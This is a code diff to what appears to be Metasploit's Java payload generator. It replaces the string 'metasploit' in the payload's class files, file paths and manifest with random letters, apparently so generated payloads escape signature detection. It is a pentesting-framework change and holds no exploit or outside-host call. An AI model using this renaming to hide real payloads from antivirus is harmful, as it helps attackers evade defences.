@@ -47,15 +47,24 @@ module Msf::Payload::Java
     raise if not respond_to? :config
     # Allow changing the jar's Main Class in the manifest so wrappers
     # around metasploit.Payload will work.
-    main_class = opts[:main_class] || "metasploit.Payload"
+    main_class = opts[:main_class]
+    replacement = opts[:metasploit_replace_string] || Rex::Text.rand_text_alpha("metasploit".length)
 
     paths = [
       [ "metasploit", "Payload.class" ],
     ] + @class_files
 
+    main_class.gsub!("metasploit", replacement) if main_class
+
     jar = Rex::Zip::Jar.new
-    jar.add_file("metasploit.dat", config)
-    jar.add_files(paths, File.join(Msf::Config.data_directory, "java"))
+    jar.add_file("#{replacement}.dat", config)
+    paths.each do |path|
+      data = File.open(File.join(Msf::Config.data_directory, "java", *path), "rb") {|fd| fd.read(fd.stat.size) }
+      data.gsub!("metasploit", replacement)
+      j_path = path.join("/").gsub("metasploit", replacement)
+      jar.add_file(j_path, data)
+    end
+
     jar.build_manifest(:main_class => main_class)
 
     jar
